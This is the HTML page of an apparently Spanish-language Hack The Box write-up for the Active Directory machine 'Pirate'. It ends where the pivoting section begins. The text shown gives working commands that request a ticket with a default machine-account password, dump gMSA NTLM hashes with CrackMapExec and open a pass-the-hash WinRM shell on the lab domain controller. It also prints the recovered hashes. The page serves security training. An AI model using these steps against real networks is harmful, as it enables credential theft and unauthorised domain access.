@@ -1,0 +1,1574 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="HTB Write-ups & Penetration Testing">
+      
+      
+        <meta name="author" content="Franksimon">
+      
+      
+        <link rel="canonical" href="https://franciscosimonwasel.github.io/security-portfolio/HTB/Pirate/">
+      
+      
+        <link rel="prev" href="../Principal/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Pirate - Francisco Simon — Security Portfolio</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/css/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#htb-machine-report-pirate" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Francisco Simon — Security Portfolio" class="md-header__button md-logo" aria-label="Francisco Simon — Security Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Francisco Simon — Security Portfolio
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Pirate
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../Meow/" class="md-tabs__link">
+          
+  
+  
+  HTB Write-ups
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Francisco Simon — Security Portfolio" class="md-nav__button md-logo" aria-label="Francisco Simon — Security Portfolio" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Francisco Simon — Security Portfolio
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB Write-ups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HTB Write-ups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Meow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Meow
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Fawn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fawn
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Dancing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dancing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Redeemer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redeemer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Reactor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reactor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Principal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Principal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pirate
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pirate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-executive-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Executive Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-port-scan-dc01" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Port Scan — DC01
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-pre-windows-2000-compatible-access-gmsa-dump" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Pre-Windows 2000 Compatible Access → gMSA Dump
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-acceso-inicial-evil-winrm-como-gmsa_adfs_prod" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Acceso Inicial — evil-winrm como gMSA_ADFS_prod$
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-ligolo-ng-pivot-a-192168100024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Ligolo-ng — Pivot a 192.168.100.0/24
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-ntlm-relay-rbcd-admin-en-web01" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. NTLM Relay + RBCD → Admin en WEB01
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. NTLM Relay + RBCD → Admin en WEB01">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#webclient-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WebClient Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ntlm-relay-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NTLM Relay Setup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtener-shell-en-web01" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Obtener Shell en WEB01
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-post-exploitation-web01" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Post-Exploitation — WEB01
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Post-Exploitation — WEB01">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-dump" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Dump
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-privilege-escalation-domain-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Privilege Escalation — Domain Admin
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Privilege Escalation — Domain Admin">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#forcechangepassword" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ForceChangePassword
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spn-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SPN Hijacking
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s4u2proxy-altservice-domain-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2Proxy + altservice → Domain Admin
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Remediation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Lessons Learned
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11. References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-executive-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Executive Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-port-scan-dc01" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 Port Scan — DC01
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-pre-windows-2000-compatible-access-gmsa-dump" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 Pre-Windows 2000 Compatible Access → gMSA Dump
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-acceso-inicial-evil-winrm-como-gmsa_adfs_prod" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Acceso Inicial — evil-winrm como gMSA_ADFS_prod$
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-ligolo-ng-pivot-a-192168100024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Ligolo-ng — Pivot a 192.168.100.0/24
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-ntlm-relay-rbcd-admin-en-web01" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. NTLM Relay + RBCD → Admin en WEB01
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. NTLM Relay + RBCD → Admin en WEB01">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#webclient-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WebClient Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ntlm-relay-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NTLM Relay Setup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obtener-shell-en-web01" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Obtener Shell en WEB01
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-post-exploitation-web01" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Post-Exploitation — WEB01
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Post-Exploitation — WEB01">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-dump" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Dump
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-privilege-escalation-domain-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Privilege Escalation — Domain Admin
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Privilege Escalation — Domain Admin">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#forcechangepassword" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ForceChangePassword
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spn-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SPN Hijacking
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s4u2proxy-altservice-domain-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2Proxy + altservice → Domain Admin
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Remediation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Lessons Learned
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11. References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="htb-machine-report-pirate">HTB Machine Report — Pirate</h1>
+<p><strong>Date:</strong> 2026-05-27
+<strong>Author:</strong> Franksimon
+<strong>Platform:</strong> Hack The Box
+<strong>Difficulty:</strong> HARD
+<strong>OS:</strong> Windows (Active Directory)
+<strong>IP:</strong> 10.129.244.95 (DC01) / Red interna: 192.168.100.0/24
+<strong>Status:</strong> Pwned</p>
+<hr />
+<h2 id="1-executive-summary">1. Executive Summary</h2>
+<p>Pirate es una máquina Windows Active Directory de dificultad Hard. El acceso inicial se logra abusando del grupo <strong>Pre-Windows 2000 Compatible Access</strong> para autenticar como <code>MS01$</code> con contraseña predeterminada y dumpear el hash NTLM de <code>gMSA_ADFS_prod$</code> vía CrackMapExec con Kerberos ccache, obteniendo shell WinRM en DC01. Con Ligolo-ng como pivote hacia la red interna (192.168.100.0/24), se detecta WebClient habilitado en WEB01 y se combina NTLM relay con RBCD para comprometer WEB01 como Administrator (user flag). La escalación a Domain Admin encadena ForceChangePassword sobre <code>a.white_adm</code>, SPN hijacking contra DC01 usando WriteSPN del grupo IT mediante <code>addspn.py</code>, y S4U2Proxy con <code>-altservice</code> para obtener un ticket <code>host/DC01</code> válido contra el DC.</p>
+<p><strong>Cadena de ataque:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>MS01$ (Pre-Win2000) → gMSA dump (CME --gmsa) → evil-winrm DC01 → Ligolo pivot
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>→ WebClient detection → NTLM relay + RBCD → Admin WEB01 (user flag) → secretsdump
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>→ ForceChangePassword → SPN hijack (addspn.py) → S4U altservice → Domain Admin
+</code></pre></div></p>
+<hr />
+<h2 id="2-enumeration">2. Enumeration</h2>
+<h3 id="21-port-scan-dc01">2.1 Port Scan — DC01</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.129.244.95
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>53/tcp</td>
+<td>DNS</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>HTTP</td>
+</tr>
+<tr>
+<td>88/tcp</td>
+<td>Kerberos</td>
+</tr>
+<tr>
+<td>135/tcp</td>
+<td>RPC</td>
+</tr>
+<tr>
+<td>139/tcp</td>
+<td>NetBIOS</td>
+</tr>
+<tr>
+<td>389/tcp</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>443/tcp</td>
+<td>HTTPS</td>
+</tr>
+<tr>
+<td>445/tcp</td>
+<td>SMB</td>
+</tr>
+<tr>
+<td>464/tcp</td>
+<td>Kerberos kpasswd</td>
+</tr>
+<tr>
+<td>593/tcp</td>
+<td>RPC over HTTP</td>
+</tr>
+<tr>
+<td>636/tcp</td>
+<td>LDAPS</td>
+</tr>
+<tr>
+<td>2179/tcp</td>
+<td>vmrdp</td>
+</tr>
+<tr>
+<td>3268/tcp</td>
+<td>Global Catalog</td>
+</tr>
+<tr>
+<td>3269/tcp</td>
+<td>Global Catalog SSL</td>
+</tr>
+<tr>
+<td>5985/tcp</td>
+<td>WinRM</td>
+</tr>
+<tr>
+<td>9389/tcp</td>
+<td>AD Web Services</td>
+</tr>
+</tbody>
+</table>
+<p>Dominio: <code>pirate.htb</code> — DC01.pirate.htb</p>
+<h3 id="22-pre-windows-2000-compatible-access-gmsa-dump">2.2 Pre-Windows 2000 Compatible Access → gMSA Dump</h3>
+<p>El grupo <strong>Pre-Windows 2000 Compatible Access</strong> contiene <code>MS01$</code> y <code>EXCH01$</code>, cuentas de máquina con contraseña predeterminada (nombre en minúsculas). Con el TGT de <code>MS01$</code> se puede leer <code>msDS-ManagedPassword</code> de cuentas gMSA.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Obtener TGT con contraseña predeterminada</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>/tmp/imp/bin/getTGT.py<span class="w"> </span><span class="s1">&#39;pirate.htb/MS01$:ms01&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.244.95
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># [*] Saving ticket in MS01$.ccache</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1"># Dumpear gMSA vía CME con Kerberos ccache</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="nv">KRB5CCNAME</span><span class="o">=</span>MS01$.ccache<span class="w"> </span>crackmapexec<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.129.244.95<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;MS01$&#39;</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache<span class="w"> </span>--gmsa
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Account: gMSA_ADCS_prod$  NTLM: 2b8849da91d5206b9d1d1dcb44467089
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Account: gMSA_ADFS_prod$  NTLM: 76754c94319e3a7dc07ba09aa79028ee
+</code></pre></div>
+<p><img alt="gMSA dump" src="../screenshots/pirate_gmsa_dump.png" /></p>
+<p>Hash NTLM de <code>gMSA_ADFS_prod$</code> obtenido. Esta cuenta es miembro de <strong>Remote Management Users</strong> en DC01.</p>
+<div class="admonition note">
+<p class="admonition-title">Autenticación de cuentas de máquina</p>
+<p><code>MS01$</code> no puede autenticarse contra LDAP via contraseña (workstation trust account → <code>invalidCredentials</code>). Obligatorio usar TGT Kerberos → <code>--use-kcache</code>.</p>
+</div>
+<hr />
+<h2 id="3-acceso-inicial-evil-winrm-como-gmsa_adfs_prod">3. Acceso Inicial — evil-winrm como gMSA_ADFS_prod$</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.244.95<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;gMSA_ADFS_prod$&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;76754c94319e3a7dc07ba09aa79028ee&#39;</span>
+</code></pre></div>
+<p><img alt="evil-winrm DC01" src="../screenshots/pirate_evilwinrm.png" /></p>
+<p>Shell como <code>pirate\gmsa_adfs_prod$</code> en DC01.</p>
+<hr />
+<h2 id="4-ligolo-ng-pivot-a-192168100024">4. Ligolo-ng — Pivot a 192.168.100.0/24</h2>
+<p>Desde evil-winrm en DC01 se sube el agente y se establece el tunnel:</p>
